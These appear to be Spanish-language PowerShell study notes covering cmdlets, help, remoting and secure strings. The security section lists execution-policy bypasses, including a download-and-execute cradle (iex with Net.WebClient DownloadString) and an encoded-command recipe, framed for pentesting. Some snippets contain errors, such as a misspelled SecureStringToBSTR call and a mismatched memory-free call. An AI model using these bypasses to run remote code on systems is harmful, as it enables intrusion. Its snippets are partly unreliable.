# Introduccion a PowerShell - 1_Conceptos Basicos_5_MasBasico

## Cmdlet:
Un cmdlet es una instancia de una clase de .NET Framework, los nombres de los cmdlet constan de 2 partes, 
````
<verbo>-<nombre>
```` 

Un cmdlet por ejemplo seria: write-output el cual el verbo seria Write y el nombre de la funcion seria output, este se usa como un print o echo

## Alias:
Los alias sirven para hacer los cmdlet mas faciles de recordar, asignando el cmdlet al alias... pj el alias cls, seria el cmdlet: clear-host
Para obtener una lista de Alias se usara el cmdlet: Get-Alias o el alias: alias

Algunos comandos de sistemas *NIX(como Alias) y sus correspondientes cmdlet:
	 
|	*NIX	|		cmdlet		|
|-----------|-------------------|
| ls		|	get-childItem	|
| cd		|	set-location	|
| cat		|	get-content		|
| mv		|	move-item		|
| history	|	get-history		|
| alias		|	get-alias		|

Para crear nuestros propios Alias, se usara el Command-let `Set-Alias`
```PowerShell
Set-Alias -Name nombre -Value Nombre-Comando
```

---

## Provider:
Un Proveedor es una apliacion basada en .NET Framework ka cual facilita el tratamiento de los datos.

Estos seran mostrados en un almacen para que puedan ser gestionados de manera sencilla.
	
El usuario podra navegar por el almacen como si se tratase del sistema de ficheros, esta apliacion consigue que la gestion del registro.

Estos son algunos:

| Proveedor | Descripcion | Comando |
| --------- | ----------- | ------- |
| Alias | Acceso a alias del entorno de pw y sus valores | set-location alias	 
| Certification | Acceso a certificados y almacenes de estos. only read |	set-location cert |		
| Entorno | Acceso a las variables de entorno de Windows | set-location env	|	
| Sistema Archivos | Acceso al sistema de archivos y directorios | set-location ``<unidad>`` |
| Registro | Acceso a las claves de registro de win | set-location {HKCU, HKLM}	|
| WFMan | Acceso a la informacion de configuracion de WSMan | set-location wsman |
| Variables	| Acceso a las variables de entorno de pwShell y sus valores | set-location variable |
| Funciones	| Acceso a las funciones definidas en el entorno pwShell | set-location function |

## Parametros:
Los parametros son modificadores que se añaden a un cmdlet para cambiar el modo de ejecucion de dicho comando.

Un cmdlet puede realizar distintas subtareas dentro de su tarea principal y los parametros activan dichas subtareas.

Los parametros son agregados despues del cmdlet y se ponen con -, pj: cmlet -parametro1 -parametroN.

Distintos tipos de parametros:

- ``Parametro Ayuda``: Este tipo esta presente en todos los cmdlets. Se indica con: -?
		
- ``Parametros dinamicos``: Estos parametros se a�aden a los scripts, proveedores o funciones cuando se cumple alguna condicion
		
- ``Parametros comunes``: Son parametros que e comparten siempre de la misma manera, siempre y cuando el cmlet los implemente.
los parametros comunes son: WhatIf, Confirm, Verbose, Debug, Warn, ErrorVariable, OutVariable y OutBuffer.
		
- ``Parametros Conmutados o Switch Parameter``: Estos parametros funcionan como interruptores, es decir pueden ir activados en la ejecucion
del cmlet o funcion o no aparecer. Ademas, este tipo de parametros pueden o no recoger un argumento. Estos parametros son
muy usados en funciones para poder ejecutar diferentes comportamientos, a traves de booleanos.
		
- ``Conjunto de parametros``: Este grupo de parametros son utilizados en un mismo cmdlet para llevar a cabo una accion concreta.

## Archivos:
los archivos son algo fundamental en cualquier sistema, ya que es la manera mas sencilla de almacenar los datos de forma persistente.

Los distintos fomatos en los que la informacion puede ser presentada tambien es importante y powerShell lo valora, por tanto en powerShell se puede obsevar distintos tipos de archivos. entre los mas importantes son:

- ``Archivo de Datos``: Este archivo dispone de extension .psd1 y se realiza para diversos propositos, almacenar el manifiesto de un modulo o almacenar los strings para la internacionalizacion del script.

- ``Archivo de modulo``: Este archivo tiene extension .psm1 y contiene un script. Este script define los miembros que se exportan del el.

- ``Archivo de Formato``: El archivo utiliza una extension del tipo .format.ps1xml y proporciona una definicion de como PowerShell debe mostrar un objeto.

- ``Archivo de Script``: Este es el mas basico de todos, ya que contiene las lineas que implementan las funcionalidades que se quieren automatizar. la extension es .ps1

- ``Archivo de tipo``: Este archivo dispone la extension .ps1xml y se encarga de heredar las propiedades de los tipos .NET Framework.

Cuando ejecutemos la linea de comandos la primera vez, no se podra ejecutar un script en PowerShell.

## Pipe y PipeLine:
Un pipe tiene una definicion clasica, y no es mas que una tuberia que conecta la salida de un proceso con la entrada de otro.
un ejemplo sencillo seria 
````powershell
<cmdlet 1> | <cmdlet 2>
````

Un pipeLine es un conjunto de cmlet que se pasan datos entre si por una tuberia, por ejemplo:
````PowerShell
Get-Process | sort -Descending id | Select-Object -First 4
````

## Modulos:
Los modulos en PowerShell son paquetes que permiten extender y disponer de escalabilidad en el lenguaje de scripting y la propia interaccion con la shell. 

Los modulos agrupan otros scripts, cmdletso funciones permitiendo compartir otras funcionalidades sin tener que rescribirlas en el codigo del script.
los modulos serian por ejemplo los import de java para visualizar los modulos disponibles se ejecutaria el ``cmdlet get-module`` con el parametro ListAvaiable.



--------------------------------------------------------
# Ayuda - 1_Conceptos Basicos_6_LaAyudaDePowerShell

La ayuda de la linea de comandos es fundamental. Hoy en dia puedes mirar en internet cualquier duda y en este caso podrias mirar la parte Technet de Microsoft, pero hay veces que es mas rapido usar la linea de comandos.

PowerShell una ayuda clasificada por extension de informacion, es decir, se podra obtener informacion con mayor o menos detalle.

Existe un cmdlet que ejecuta la tarea de la ayuda denominado ``get-help``. Existe la funcion help que es muy util como se vera posteriormente.

Existen tambien alias com man, nomenclatura cercana a los entornos ``*NIX``. Y tambien se puede usar el parameto ``-?``

Existen 3 niveles de profundidad en la ayuda de PowerShell:

- ``Ayuda por defecto o estandar``: cuando se ejecuta el cmdlet get-help, alguno de sus alias o el parametro de ayuda, este es el tipo de ayuda que se ofrece para la visualizacion por parte del usuario. No incluira ejemplos en la ayuda.

- ``Ayuda en detalle o detallada``: La informacion que se ofrece es considerablemente mayor que en la ayuda estandar. Se ofrece gran cantidad de ejemplos de uso sobre la ayuda requerida. Esto se obtiene con el parametro detailed, ``get-help <comando> -detailed``

- ``Ayuda completa``: La informacion que se ofrece es, tambien, mayor que la estadar. Ademas ofrece informacion tecnica sobre la ayuda requerida. Para obtener esta ayuda se debe ejecutar ``get-help <comando> -full``.

Otra opcion para mostrar ejemplos directamene es utilizar el parametro examples.
para obtener ayuda sintactica de powerShell para la estructura de condiciones o bucles se usa la instruccion help y la sentencia, por ejemplo: ``help if``

La diferencia entre ``Get-help`` y help es la salida que en ``help`` esta formateada y en ``get-help`` no.

Para que ``Get-Help`` tenga una salida formateada y ordenada lo pasaremos por un pipe y el comando more: ``get-help cmdlet -detailed | more``

## Categorias:
Cuando se ejecuta la sentenia get-help * se obtiene una columna que es categoria. Esta columna infica que es realmente sobre lo que se solicita la ayuda. Se puede observar que no solo existe ayuda para los cmdlet.
Las distintas categorias:
- Cmdlet
- Proveedores
- Funciones
-  Alias
- Archivo de ayuda.

Los archivos de ayuda son muy interesantes ya que ofrecen informacion detallada, por ejemplo, sobre los componentes sintacticos del lenguaje de scripting de powershell. Vienen definidos con una gran cantidad de ejemplos.

## Atajos de teclado:
Siempre han sido utiles en el dia a dia los atajos del teclado, y mas en un mundo en el que el tiempo cada vez es mas necesario.

Por este tipo de razones se hace hincapie en como pueden hacerse uso de estos en la linea de comandos PowerShell. Al principio, estos atajos pueden ser dificiles de recordar, pero su uso en el dia a dia facilitara la rapida interaccion con la linea de comandos.

- Un atajo es usar el tabulador, como se usa en Bash.

- Otro atajo es usar CTRL + Flecha derecha / izquierda.

- Las teclas F7, F8 Y F9 proporcionan acceso rapido al historico de instrucciones ejecutadas.

- F7 proporciona al usuario un listado, mediante la visualizacion de un cuadro de dialogo en consola de las ultimas instrucciones ejecutadas.

- F8 introduce en la misma linea las ultimas intrucciones, para que directamente el usuario pueda ejecutarlas.

- F9 pregunta, mediante un cuadro de dialogo en el entorno, o el numero asociado a la instruccion que se puede visualizar con F7.




--------------------------------------------------------
# Seguridad - 1_Conceptos Basicos_7_SeguridadEnPowerShell

En la linea de comandos de PowerShell existen diferentes politicas que evitan que ciertos scripts puedan ser ejecutados pos cualquier usuario. Existen ciertos metodos que permiten controlar los permisos sobre los ficheros, incluso metodos o funciones que fortifican y aseguran las cadenas de texto. En ciertas ocasiones estas medidas no son suficientes si no existe una configuracion correcta del entorno. Las debilidades y errores de configuracion de los sistemas puedan provocar errores importantes, que pueden acabar en una elevacion del privilegio o una ejecucion de codigo arbitrario sobre un sistema.

## Politicas de ejecucion de PowerShell
Con estas politicas se impide que un script se ejecute en el equipo. Este mecanismo es las politica de ejecucion.

Como se ha mencionado anteriormente, este politica de ejecucion dispone de diferentes opciones y configuraciones.

En un entorno laboral se puede utilizar este mecanismo para asegurar que apliaciones maliciosas no pueden ejecutar codigo en el equipo para tomar ventaja en un entorno concreto.

En un entorno de pentesting tambien puede ser un obstaculo, pero existen maneras para bypasear la politica de ejecucion.

Para consultar la politica de ejecucion actual se dipone del ``cmdlet Get-Executionpolicy``.

Para cambiar la politica de ejecucion se dispone del ``cmdlet Set-Executionpolicy <politica a cambiar>``

## Ambitos
El usuario debe entender los ambitos de PowerShell, al menos tener una idea de lo que son y como actuan. Estos aportan cierta riqueza a la linea de comandos y las acciones que se realizan en ella.

- Process: La politica de ejecucion afecta al proceso en curso, es decur a la sesion de PowerShell. Este ambito no es persistente.

- CurrentUser: La politica de ejecucion afecta al usuario actual. Se almacena en el registro de winfows en la parte correspondiente al usuario, por lo que es persistente.

- LocalMachine: La politica de ejecucion afecta a todos los usuarios de la maquina. Se almacena de manera persistente en la parte del registro ``HKEY_LOCAL_MACHINE``

El cmdlet ``Get-Executionpolicy`` junto al parametro ``-list`` permite obtener las politicas de ejecucion apliacadas a los distintos ambitos.

Para configurar una politica a cualquier ambito se debe utilizar el parametro ``-scope``.

## Bypass a la politica de ejecucion de PowerShell
Hay diferentes maneras de llevar a cabo un bypass a la politica de ejecucion de PowerShell:

1. La primera y mas sencilla de todas es la de copiar y pegar el contenido de un script en la consola

2. Utilizacion del comando echo para escribir el contenido del script en la PowerShell y se pasa el contenido a traves de un pipe a la aplicacion. Un ejemplo: ``Write-Host "mi bypass" | PowerShell -noprofile`` - Otra opcion es usar cat leyendo el ``.ps1`` y pasarlo mediante un pipe

3. Se puede utilizar el argumento --command cuando se lance el binario PowerShell en la linea de comandos, ejemplo: ``PowerShell --command "Write-Host 'esto es un bypass'"``

4. Se puede utilizar el comando Invoke-Command. Como ejemplo: ``Invoke-Command --Scriptblock{write-host "esto es un bypass"}``

5. Encodear el contenido del script y ejecutarlo con el argumento ``--EncodedCommand``. En primer lugar hay que almacenar el contenido encodeado en una variable, por ejemplo: ``$contenido = " Write-Host 'mi bypass' ";$bytes=[System.Text.Encoding]::Unicode.GetBytes($contenido);$encoded = [Convert]::ToBase64String($bytes)``. Una vez que se tiene el texto encodeado se invoca de la siguiente manera: ``PowerShell.exe --EncodedCommand $encoded``

6. Se puede utilizar el flag Execution-Policy. La sintaxis para ejecutar la instruccion seria la siguiente: ``PowerShell --ExecutionPolicy Bypass -File <script>`` Se puede utilizar el argumento ``-ExecutionPolicy`` para indicar la politica que se quiere utilizar, siendo Bypass una politica especial para este tupo de caos.

7. Descargar el contenido del script y ejecutarlo invocando a PowerShell. El ejemplo de esta via seria: ``PowerShell -noprofile -c "iex(New-Object Net.WebClient).DownloadString('direccionURL')"``

Como se puede ver algunas de los bypass son obvios, pero muy efectivos cuando el pentester tiene una politica que le bloquea.

Disponer de acceso local permite que el usuario pueda utilizar cualquiera de estos metodos para conseuir saltarse una politica que le restrinja. Si el acceso es remoto, se pueden utilizar algunas como por ejemplo la septima opcion para descargar el contenido.

## La ejecucion remota y como comunicarse:
Administrar sistemas requiere poder consultar y ejecutar tareas sobre maquinas y recursos con ubicaciones remotas dentro del entorno empresarial. La linea de comandos de PowerShell proporciona la posibilidad de llevar a cabo esta gestion gracias a .NET Framework.

## Creacion y configuracion de una sesion remota:
Existen gran cantidad de cmdlets en PowerShell que permiten ejecutar instrucciones remotas. Por ejemplo, para listar los servicios de una maquina remota: ``Get-Service -ComputerName <nombreMaquina> -Name EFS``

Las sesiones remotas pueden ser creadas tras habilitar Windows Remote Management. Oara llevar a cabo esta accion se usaria: ``Enable-PSRemoting``

La conexion de red debe estar en un perfil de dominio o privado, pero nunca publico.

Otro error muy comun es que el host al que el usuario quiera conectarse no sea de confianza y para solucionar eso se ha de añadir al archivo de equipos de confianza los equipos que se quieren administrar. Si se añade un *, todos seran de confianza.

Una vez se dispone del entorno preparado para crear las sesiones remotas, pero esta funcion se dispone de: ``New-PSSession``

| Parametro | Descripcion |
| --------- | ----------- |
| Credential | Se especifica con que usuario y credenciales se quiere iniciar sesion |
| Port | Indica el puerto al que se conectara PowerShell, por defecto es puerto 80 |
| ComputerName | Crea una conexion con la maquina que se especifica, la sesion es persistente	|
| UseSSL | Utiliza el protocolo SSL para establecer la conexion, por defecto, no se usa SSL |

Para crear la sesion como el usuario con el que se esta logueado en el sistema local hay qie ejecutar: ``New-PSSesion -ComputerName <NombreMaquina>``

En cualquier instante, puede ser necesario que el usuario disponga de un sesion con otro usuario conocido en la maquina remota.

Por esta razon, se debe ejecutar la siguiente instruccion: ``$cred = get-credential; new-PSSession -ComputerName <nombreMaquina> -Credential $cred``.
	
Esta instruccion solicita las credenciales, a traves del cmdlet: ``Get-Credential`` y despues crea la sesion indicando las credendiales almacenadas con el parametro ``-Credential``.

## Las ejecuciones remotas:
Cuando se ha creado una sesion puede resultar insteresante entender como se puede ejecutar instrucciones remotas. En primer lugar se tiene que tener claro que para poder llevar a cabo la ejecucion de estas instrucciones estas deben ser especificadas como si de un script se tratase.

El cmdlet que lleva a cabo la ejecucion de una instruccion remota es ``Invoke-Command``. Este cmdlet proporciona al usuario 2 parametros como son -Session y -ScriptBlock. Un ejemplo: ``Invoke-Command -Session <ObjetoSesion> -ScriptBlock{instruccione1;instruccion2}``

Para obtener una sesion y almacenarla en una variable se puede utilizar la siguiente sentencia: ``$sesion = Get-PSSesion -id <X>``

## Utilidades Remotas:

Las ejecuciones y sesiones remotas abren un abanico de posibilidades en la administracion de sistemas dentro de un entorno empresarial.
	
Para llevar a cabo una ejecucion de un script a traves de una sesion se utiliza el cmdlet ``Invoke-Comman``d junto al parametro ``-FilePath``.

Con FilePath se indica el comando donde debe buscar el script que se lanzara en remoto.

El parametro ``ScriptBlock`` y ``FilePath`` son incompatibles, por lo que no se puede ejecutar ambos parametros en la misma sentencia, ejemplo de FilePath: ``Invoke-Command -Session <ObjetoSesion> -FilePath <RutaScript>``

En la salida de los scripts remotos se da cierta informacion que quiza el usuario no quiera que se muestre con el equipo sobre el que se esta ejecutando el script. Para este caso se dispone del parametro ``HideComputerName``, con el que la ejecucion no mostrara en que equipo se llevo a cabo el proceso.

Para abrir una sesion de PowerShell en una maquina remota se puede utilizar el ``cmdlet Enter-PSSession``. Con este cmdlet solo hay que indicar cual es la maquina sobre la que se quiere lograr el control de la siguiente forma: ``Enter-PSSession -ComputerName<NombreMaquina>``.

Si se quieren usar otras credenciales se usara el cmdlet: Get-Credential. Un ejemplo seria: ``$cred = Get-Credential; Enter-PSSession -ComputerName<NombreMaquina> -Credential $cred``

## Fortificar la informacion en la linea de comandos:
En los equipos de trabajo se pueden almacenar datos sensibles, los cuales siempre deberian de estar protegidos.

La RAM es una de las zonas que por su volatilidad, en muchas ocasiones, se piensa que es menos peligroso que la informacion no este protegida. Logicamente es mentira, puesto que un atacante podria leer la memoria del dispositivo.

Para esto estan las cadenas seguras, que son un tipo de Strings que cogen el dato y el FramWork se encarga de cifrar.

Estas cadenas tienen estas propiedades:
| Propiedad | Descripcion |
| --------- | ----------- |
| Acceso Controlado | A las cadenas de tento se les puede añadir texto caracter a caracter. Si se intenta agregar mas de uno, se producira un error |
| Contenido Cifrado	| Es el Framwork el encargado de cifrar caracter por caracter. |
| No duplicacion | Las cadenas seguras no se duplican en memoria. Estan fuera del alcance del recolector de basura de PowerShell, ya que este podria duplicar la informacion |

## Creacion de una cadena Segura:
En algunas ocasciones es necesario proteger la informacion que es adquirida por PowerShell. Por ejemplo cuando un Script recoge un valor sensible al usuario, para eso usamos el cmdlet ``Read-Host`` con el parametro ``-AsSecureString`` : ``$sec = Read-Host -AsSecureString``

Al introducir el texto se protege con asteriscos el texto sensible. El objeto no puede leerse de forma directa puesto que este se encuentra protegido.

El comando ``ConvertTo-SecureString``, permite la creacion de la cadena segura a raiz de una cadena de texto plano.

Existe una curiosidad y es que si se crean 2 cadenas seguras que albergan el mismo texto, un atacante malicioso podria intentar realizar fuerza bruta sobre ellas. En PowerShell el mismo texto cuando es pasado a cadena segura no es el mismo objeto, por lo que si se aplicase el metodo equals sobre ambos objetos el valor devuelto seria ``false``.

## Leyendo las cadenas Seguras:
Para la lectura de cadenas seguras se puede utilizar un metodo donde el recolector de basura de PowerShell no puede intervenir.

Se copia el valor de la cadena segura a una zona de memoria donde el recolector de basura no tiene acceso.

Si el recolector tuviera acceso en esa zona de memoria, se podria copiar el valor a otra zona donde un atacante podria acceder.
	
La tecnica SecureStringToBSTR es la que asignara el valor de la cadena segura a una zona de memoria donde el recolector de basura no puede acceder. Con esta tecnica se obtiene un puntero a la zona de memoria no gestionada por el recolector.

Despues con PtrToStringUni se duplicara el contenido de la cadena pero ya en plano.

Hay que utilizar rapidamente el valor que se ha recuperado y eliminar el puntero a la zona de memoria no gestionada por el recolector, y la modificacion de la cadena en claro cuando ya no se necesite. por ejemplo:

````PowerShell
$sec = Read-Host -AsSecureString
$ptr = [System.Runtime.InteropServices.Marshal]::SecureStringToBST($sec)
$claro = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($ptr)
$claro
#libreramos ptr
[System.Runtime.InteropServices.Marshal]::ZeroFreeCoTaskMemUnicode($ptr)
````

## Gestionar credenciales
Las credenciales es algun fundamental y muy sensible en el mundo de la seguridad y sobre todo en el mundo empresarial.

Es importante hacer la mayoria de las operaciones con los minimos privilegios, si por algun casual se requiere de permisos superiores usaremos la instruccion ``Get-Credentials`` de la siguiente forma por ejemplo:
````PowerShell
Copy-Item <ArchivoOrigen> <ArchivoDestino> -Credential $(Get-Credential)
````